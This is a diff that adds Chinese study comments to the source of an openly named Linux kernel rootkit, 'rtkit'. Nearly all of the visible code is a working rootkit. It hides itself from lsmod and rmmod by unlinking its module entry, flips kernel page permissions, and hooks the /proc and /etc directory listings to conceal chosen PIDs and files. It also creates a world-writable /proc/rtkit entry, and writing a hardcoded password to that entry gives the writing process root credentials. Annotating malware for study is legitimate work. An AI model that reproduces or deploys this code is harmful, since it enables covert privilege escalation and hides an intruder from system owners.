@@ -46,6 +46,9 @@ static char module_status[1024];
 //MODULE HELPERS
 void module_hide(void)
 {
+//让lsmod，和rmmod无法发现mod
+//这里和隐藏/proc/rtkit这个目录不一样
+//链表删除操作
 	if (module_hidden) return;
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
@@ -69,6 +72,7 @@ static void set_addr_rw(void *addr)
 {
 	unsigned int level;
 	pte_t *pte = lookup_address((unsigned long) addr, &level);
+	//找到地址的属性地址，改变页属性
 	if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
 }
 
@@ -87,11 +91,14 @@ static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t off
 		if (!strcmp(name, pids_to_hide[i])) return 0;
 	}
 	if (!strcmp(name, "rtkit")) return 0;
+	//在这里执行过滤
 	return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
 }
 
 static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
 {
+//这个函数的功能是把回调函数传给proc_readdir_orig
+//在这里我们使用了我们自己的回调函数
 	proc_filldir_orig = filldir;
 	return proc_readdir_orig(filp, dirent, proc_filldir_new);
 }
@@ -99,6 +106,7 @@ static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
 static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
 	if (hide_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) return 0;
+	//过滤掉__rt开头和10__rt
 	return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
 }
 
@@ -143,7 +151,11 @@ STATUS\n\
 
 static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
 {
-	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
+	if (!strncmp(buff, "mypenislong", MIN(11, count))) { 
+		//changes to root
+		//对所有用户而言，其程序都是root权限的
+		//To alter the current process's credentials
+		//也就是说谁执行这个写操作，谁就获取了root权限
 		struct cred *credentials = prepare_creds();
 		credentials->uid = credentials->euid = 0;
 		credentials->gid = credentials->egid = 0;
@@ -190,18 +202,23 @@ static int __init procfs_init(void)
 {
 	//new entry in proc root with 666 rights
 	proc_rtkit = create_proc_entry("rtkit", 0666, NULL);
+	//create_proc_entry 在 /proc 文件系统中创建一个虚拟文件
 	if (proc_rtkit == NULL) return 0;
 	proc_root = proc_rtkit->parent;
 	if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
 		return 0;
 	}
+	//查看是否真在/proc目录下
 	proc_rtkit->read_proc = rtkit_read;
+	//重定向读函数
 	proc_rtkit->write_proc = rtkit_write;
 	
 	//substitute proc readdir to our wersion (using page mode change)
 	proc_fops = ((struct file_operations *) proc_root->proc_fops);
 	proc_readdir_orig = proc_fops->readdir;
+	//修改读目录这个函数
 	set_addr_rw(proc_fops);
+	//使这个指针可写
 	proc_fops->readdir = proc_readdir_new;
 	set_addr_ro(proc_fops);
 	
@@ -213,8 +230,10 @@ static int __init fs_init(void)
 	struct file *etc_filp;
 	
 	//get file_operations of /etc
+	//对/etc这个目录下的操作进行hack
 	etc_filp = filp_open("/etc", O_RDONLY, 0);
 	if (etc_filp == NULL) return 0;
+	
 	fs_fops = (struct file_operations *) etc_filp->f_op;
 	filp_close(etc_filp, NULL);
 	
@@ -222,6 +241,7 @@ static int __init fs_init(void)
 	fs_readdir_orig = fs_fops->readdir;
 	set_addr_rw(fs_fops);
 	fs_fops->readdir = fs_readdir_new;
+	//修改读普通文件目录这个函数
 	set_addr_ro(fs_fops);
 	
 	return 1;
@@ -232,6 +252,7 @@ static int __init fs_init(void)
 static int __init rootkit_init(void)
 {
 	if (!procfs_init() || !fs_init()) {
+		//只要任意一个不成功，clean
 		procfs_clean();
 		fs_clean();
 		return 1;
